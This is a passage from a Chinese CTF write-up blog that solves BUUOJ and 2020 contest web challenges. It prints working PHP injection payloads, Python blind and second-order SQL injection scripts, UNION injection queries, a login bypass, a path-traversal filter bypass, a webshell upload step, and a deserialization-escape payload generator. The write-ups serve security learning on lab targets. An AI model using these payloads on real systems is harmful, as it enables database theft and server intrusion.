&#x2F;1nD3x.php?%64%65%62%75&#x3D;%61qua%5fis%5fcut%65%0a&amp;file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;;&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">url解码结果：</span><br><span class="line">flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;;&#125;require(php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1flag.php);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>生成poc脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;;</span><br><span class="line">$arr1 &#x3D; explode(&#39; &#39;, $a);</span><br><span class="line">echo &quot;&lt;br&gt;~(&quot;;</span><br><span class="line">foreach ($arr1 as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">echo &quot;%&quot;.bin2hex(~$value);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;)&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure><p>补充：因为<code>preg_match()</code>只能匹配字符串，数组可以绕过</p><p>参考资料：</p><blockquote><p><a href="https://www.gem-love.com/websecurity/770.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/770.html</a></p><p><a href="https://imagin.vip/?p=166" target="_blank" rel="noopener">https://imagin.vip/?p=166</a></p></blockquote><h3 id="0x-04-网鼎杯2018-Unfinish"><a href="#0x-04-网鼎杯2018-Unfinish" class="headerlink" title="0x 04 [网鼎杯2018]Unfinish"></a>0x 04 [网鼎杯2018]Unfinish</h3><ul><li>考点</li></ul><p>SQL花式盲注、二次注入</p><ul><li>解题过程</li></ul><ol><li>题目存在注册界面，尝试进行二次注入</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39; or (case when 1&#x3D;1 then sleep(3) else &#39;2&#39; end)&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line"># 对应后台语句为</span><br><span class="line">insert into users(email,username,password) values (&#39;aa&#39;,&#39;&#39; or (case when 1&#x3D;1 then sleep(3) else &#39;2&#39; end)&#x3D;&#39;1&#39;,&#39;bb&#39;)</span><br></pre></td></tr></table></figure><p>存在延时，可以进行注入，编写exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#encoding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">database &#x3D; &quot;&quot;</span><br><span class="line">hex_database &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">def req(payload,asc):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;c509d4bd-4e45-48b5-a41f-63ea559f3fb6.node3.buuoj.cn&#x2F;register.php&quot;</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;username&quot;: payload,</span><br><span class="line">        &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;email&quot;: &quot;222@qq.com&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    st &#x3D; time.time()</span><br><span class="line">    r &#x3D; requests.post(url, headers&#x3D;header,data&#x3D;data, timeout&#x3D;100)</span><br><span class="line">    if r.status_code !&#x3D; 200:</span><br><span class="line">        return req(payload, asc)</span><br><span class="line">    else:</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            return asc</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">i &#x3D; 1</span><br><span class="line">while i &lt; 10:</span><br><span class="line">    for j in range(30,148):</span><br><span class="line">        j &#x3D; chr(j)</span><br><span class="line">        k &#x3D; j.encode(&#39;hex&#39;)</span><br><span class="line">        username &#x3D; &quot;&#39;^(case  hex(mid((select * from flag limit 1 offset 0) from 1 for &quot;+str(i)+&quot;)) when &#39;&quot;+ hex_database+ k +&quot;&#39; then sleep(3) else &#39;b&#39; end)+&#39;0&quot;</span><br><span class="line">        print username</span><br><span class="line">        if req(username,j)!&#x3D;&#39;&#39;:</span><br><span class="line">            database &#x3D; database + j # 这儿的j是字母</span><br><span class="line">            hex_database &#x3D;  hex_database + k # 这儿的k是字母对应的hex</span><br><span class="line">            print database</span><br><span class="line">            break</span><br><span class="line">    i &#x3D; i + 1</span><br></pre></td></tr></table></figure><p>需要注意的是长字符串转成数字型数据的时候会变成科学计数法，也就是说会丢失数据精度，最多每次比较10个字符长度，最后拼接成flag</p><blockquote><p>参考资料：</p><p><a href="https://glotozz.github.io/2019/11/20/buuctf-wp-8/" target="_blank" rel="noopener">https://glotozz.github.io/2019/11/20/buuctf-wp-8/</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104216070" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104216070</a></p><p><a href="https://altman.vip/2018/08/22/WDB-2/#unfinished" target="_blank" rel="noopener">https://altman.vip/2018/08/22/WDB-2/#unfinished</a></p></blockquote><h3 id="0x-05-Black-Watch-入群题-Web"><a href="#0x-05-Black-Watch-入群题-Web" class="headerlink" title="0x 05 [Black Watch 入群题]Web"></a>0x 05 [Black Watch 入群题]Web</h3><ul><li><p>考点</p><p>SQL注入</p></li><li><p>解题过程</p></li></ul><p>查询处的接口存在SQL注入，脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># if correct , return empty, else return something</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;8fdba9ab-ef49-4d4f-8f91-230c12ae7173.node3.buuoj.cn&#x2F;backend&#x2F;content_detail.php?id&#x3D;&quot;</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># [+] --&gt;admin,contents&lt;--</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;contents&#39;)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># id,title,content,is_enable</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;admin&#39;)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># id,username,password,is_enable</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># 5c15f69a,06ccfb16</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(username))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># e6d20586,863efe1a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def req(url_tmp):</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    res &#x3D; requests.get(url_tmp, headers&#x3D;header)</span><br><span class="line">    if res.status_code !&#x3D; 200:</span><br><span class="line">        return req(url_tmp)</span><br><span class="line">    else:</span><br><span class="line">        r &#x3D; res.content.decode(&#39;utf8&#39;)</span><br><span class="line">        if &quot;title&quot; in r:</span><br><span class="line">            return 1</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">index &#x3D; 1</span><br><span class="line">tmp &#x3D; 0</span><br><span class="line">while True:</span><br><span class="line">    u_bound &#x3D; 255; l_bound &#x3D; 0</span><br><span class="line">    while u_bound &gt;&#x3D; l_bound:</span><br><span class="line">        m_bound &#x3D; (u_bound + l_bound) &#x2F;&#x2F; 2</span><br><span class="line">        payload_tmp &#x3D; payload.format(index, m_bound)</span><br><span class="line">        url_tmp &#x3D; url + urllib.parse.quote(payload_tmp)</span><br><span class="line">        if req(url_tmp)!&#x3D;&#39;&#39;:</span><br><span class="line">            u_bound &#x3D; m_bound - 1</span><br><span class="line">            tmp &#x3D; m_bound</span><br><span class="line">        else:</span><br><span class="line">            l_bound &#x3D; m_bound + 1</span><br><span class="line">    result +&#x3D; chr(tmp)</span><br><span class="line">    index +&#x3D; 1</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>这里有个坑 ，第一个账号是无效的，第二个账号可以成功登入</p><blockquote><p>参考资料：</p><p><a href="http://p3rh4ps.top/index.php/2019/12/28/19-12-28-%e8%a7%a3%e5%86%b3buu%e9%99%90%e5%88%b6%e8%ae%bf%e9%97%ae%e9%a2%91%e7%8e%87%e9%97%ae%e9%a2%98%e7%9a%84%e7%9b%b2%e6%b3%a8%e8%84%9a%e6%9c%ac/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2019/12/28/19-12-28-%e8%a7%a3%e5%86%b3buu%e9%99%90%e5%88%b6%e8%ae%bf%e9%97%ae%e9%a2%91%e7%8e%87%e9%97%ae%e9%a2%98%e7%9a%84%e7%9b%b2%e6%b3%a8%e8%84%9a%e6%9c%ac/</a></p><p><a href="http://www.ch4ser.top/2019/04/22/SQL题型记录/" target="_blank" rel="noopener">http://www.ch4ser.top/2019/04/22/SQL%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</a></p></blockquote><h3 id="0x-06-virink-2019-files-share"><a href="#0x-06-virink-2019-files-share" class="headerlink" title="0x 06 virink_2019_files_share"></a>0x 06 virink_2019_files_share</h3><ul><li><p>考点</p><p>OpenResty、LFR、Lua - Regex</p></li><li><p>解题过程</p></li></ul><ol><li>打开页面是拼魔方游戏</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216000926709.png" alt></p><ol start="2"><li>查看js代码无过，发包测试发现服务器是用OpenResty服务器（OpenResty是一个基于Nginx与Lua的高性能Web平台，其内部集成了大量精良的Lua库、第三方模块以及大多数的依赖项。）</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001215842.png" alt></p><ol start="3"><li>在源代码处发现存在一个uploads文件夹，访问下</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001314589.png" alt></p><ol start="4"><li>里面左边preview的格式是/preview?f= 尝试文件包含漏洞,由于是使用OpenResty，尝试包含nginx的配置文件，默认是<code>/etc/nginx/conf.d/default.conf</code>,发现<code>../</code>被过滤，尝试下双写可以绕过</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001437543.png" alt></p><ol start="5"><li><p>首页注释代码提示Hint : flag in f1ag_Is_h3re </p><p>构造：<code>/preview?f=....//....//....//....//....//....//....//f1ag_Is_h3re..//flag</code></p><p>获得flag</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020新春战疫-网络安全公益赛解题记录</title>
      <link href="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-第一天"><a href="#0x-01-第一天" class="headerlink" title="0x 01 第一天"></a>0x 01 第一天</h3><h4 id="1-1-签到"><a href="#1-1-签到" class="headerlink" title="1.1 签到"></a>1.1 签到</h4><p>抖音号：GAME.CTF里面的视频结尾就有</p><h4 id="1-2-code-in-morse"><a href="#1-2-code-in-morse" class="headerlink" title="1.2 code_in_morse"></a>1.2 code_in_morse</h4><p>流量包导出http对象，得到一个作者上传的一个jpg文件，改一下后缀打开得到一串莫斯电码，解码发现是base32格式，继续解码发现有png文件头，群里有师傅给了提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py &gt; 1.png</span><br></pre></td></tr></table></figure><p>有师傅这样做的</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200221222133362.png" alt></p><p>将条形码扫码，扫码网址：<a href="https://www.sojson.com/qr/deqr.html" target="_blank" rel="noopener">https://www.sojson.com/qr/deqr.html</a></p><p>得到一个网址：<a href="https://s2.ax1x.com/2020/02/06/1yPXJ1.jpg" target="_blank" rel="noopener">https://s2.ax1x.com/2020/02/06/1yPXJ1.jpg</a></p><p>访问得到一张图片，提示F5隐写，使用解密脚本得到flag</p><h4 id="1-3-ezupload"><a href="#1-3-ezupload" class="headerlink" title="1.3 ezupload"></a>1.3 ezupload</h4><p>直接上传php文件，连接蚁剑，执行./readflag得到flag</p><h4 id="1-4-简单的招聘系统"><a href="#1-4-简单的招聘系统" class="headerlink" title="1.4 简单的招聘系统"></a>1.4 简单的招聘系统</h4><p>方法一：</p><p>二次注入，exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#encoding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">database &#x3D; &quot;&quot;</span><br><span class="line">hex_database &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">def req(payload,asc):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;caddecc79f07485cb789f035fc7b3c3027c1555d32204a11.changame.ichunqiu.com&#x2F;index.php?register&quot;</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;regname&quot;: payload,</span><br><span class="line">        &quot;regpass&quot;: &quot;1&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    st &#x3D; time.time()</span><br><span class="line">    r &#x3D; requests.post(url, headers&#x3D;header,data&#x3D;data, timeout&#x3D;100)</span><br><span class="line">    if r.status_code !&#x3D; 200:</span><br><span class="line">        return req(payload, asc)</span><br><span class="line">    else:</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            return asc</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">i &#x3D; 1</span><br><span class="line">while i &lt; 10:</span><br><span class="line">    for j in range(30,148):</span><br><span class="line">        j &#x3D; chr(j)</span><br><span class="line">        k &#x3D; j.encode(&#39;hex&#39;)</span><br><span class="line">        username &#x3D; &quot;&#39;^(case  hex(mid((select flaaag from flag limit 1 offset 0) from 37 for &quot;+str(i)+&quot;)) when &#39;&quot;+ hex_database+ k +&quot;&#39; then sleep(3) else &#39;b&#39; end)+&#39;0&quot;</span><br><span class="line">        print username</span><br><span class="line">        if req(username,j)!&#x3D;&#39;&#39;:</span><br><span class="line">            database &#x3D; database + j # 这儿的j是字母</span><br><span class="line">            hex_database &#x3D;  hex_database + k # 这儿的k是字母对应的hex</span><br><span class="line">            print database</span><br><span class="line">            break</span><br><span class="line">    i &#x3D; i + 1</span><br></pre></td></tr></table></figure><p>方法二：弱口令+SQL注入查询 </p><p>登陆处万能密码 1’ or 1=1# 然后在blank page查询处查flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,database(),3,4,5#   </span><br><span class="line">&#x2F;&#x2F; database():nzhaopin</span><br><span class="line">1&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()#     </span><br><span class="line">&#x2F;&#x2F; backup,flag,user</span><br><span class="line">1&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name&#x3D;&#39;flag&#39;#</span><br><span class="line">&#x2F;&#x2F; id,flaaag</span><br><span class="line">1&#39; union select 1,group_concat(flaaag),3,4,5 from flag#</span><br><span class="line">&#x2F;&#x2F; flag&#123;548f455e-fc8f-48c4-95ea-62ee4b645a68&#125;</span><br></pre></td></tr></table></figure><p>方法三：二次注入</p><p>猜测注册的语句应该是<code>$sql=insert into table values($id,&#39;$username&#39;,&#39;$password&#39;,&#39;$key&#39;)</code></p><p>构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注册：</span><br><span class="line">test&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#</span><br><span class="line">登录：</span><br><span class="line">账号：test</span><br><span class="line">密码：123</span><br><span class="line">得到数据库：backup,flag,user</span><br><span class="line">同理进一步查询可以得到flag</span><br></pre></td></tr></table></figure><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225201009458.png" alt></p><h4 id="1-5-盲注"><a href="#1-5-盲注" class="headerlink" title="1.5 盲注"></a>1.5 盲注</h4><p>waf了<code>= &lt;&gt; like select union * &#39;</code>等,使用regex进行正则匹配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;0013a95d8ad14842a9bcba0096d069cb38ec1889e4534760.changame.ichunqiu.com&#x2F;index.php?id&#x3D;1 &quot;</span><br><span class="line">list &#x3D; &quot;qwertyuiopasdfghjklzxcvbnm_-0123456789&#123;&#125;&quot;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &quot;flag&#123;af35b43b&quot;</span><br><span class="line">for j in range(35):</span><br><span class="line">    for i in list:</span><br><span class="line">        st &#x3D; time.time()</span><br><span class="line">        payload &#x3D; url + &#39;&#39;&#39;and if((fl4g regexp &quot;^&#123;&#125;&quot;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        r &#x3D; requests.get(payload, timeout&#x3D;100)</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            print i</span><br><span class="line">            flag&#x3D;flag+i</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h4 id="1-6-babyphp"><a href="#1-6-babyphp" class="headerlink" title="1.6 babyphp"></a>1.6 babyphp</h4><p>扫描目录发现<a href="http://www.zip源码泄露，下载审计" target="_blank" rel="noopener">www.zip源码泄露，下载审计</a></p><p>反序列化参考：<a href="https://www.gem-love.com/ctf/1669.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1669.html</a></p><p>由于是在逃逸字符，我们需要保证payload在进入属性中之后可以正常反序列化</p><p>通过本地调试，得到正常序列化时的字符</p><p><code>&quot;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;s:4:&quot;test&quot;;s:8:&quot;CtrlCase&quot;;N;}&quot;</code></p><p>其中nickname和age是可控内容</p><p>注意前面的内容中标注了有3个属性，为了保证属性一致，在payload前面加上CtrlCase的内容，然后在最后闭合语句，使unserialize忽略掉后面的CtrlCase</p><p>根据这个payload的字符数，我们需要在nickname中插入足量的黑名单字符，把payload挤出去</p><p>参考大师傅的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $age&#x3D; &#39;select password,id from user where username&#x3D;?&#39;; &#x2F;&#x2F;要把id放password后面</span><br><span class="line">    public $nickname&#x3D;null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UpdateHelper</span><br><span class="line">&#123;</span><br><span class="line">    public $sql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser&#x3D;&quot;noob123&quot;;</span><br><span class="line">    public $dbpass&#x3D;&quot;noob123&quot;;</span><br><span class="line">    public $database&#x3D;&quot;noob123&quot;;</span><br><span class="line">    public $name&#x3D;&#39;admin&#39;;</span><br><span class="line">    public $token &#x3D; &#39;admin&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y1ng &#x3D; new UpdateHelper();</span><br><span class="line">$y1ng-&gt;sql &#x3D; new User();</span><br><span class="line">$y1ng-&gt;sql-&gt;nickname &#x3D; new Info();</span><br><span class="line">$y1ng-&gt;sql-&gt;nickname-&gt;CtrlCase &#x3D; new dbCtrl();</span><br><span class="line"></span><br><span class="line">$y1ng &#x3D; &#39;&quot;;s:8:&quot;CtrlCase&quot;;&#39; . serialize($y1ng) . &quot;&#125;&quot;;</span><br><span class="line">$length &#x3D; strlen($y1ng);</span><br><span class="line">$y1ng &#x3D; str_repeat(&#39;union&#39;, $length).$y1ng;</span><br><span class="line">echo($y1ng);</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where 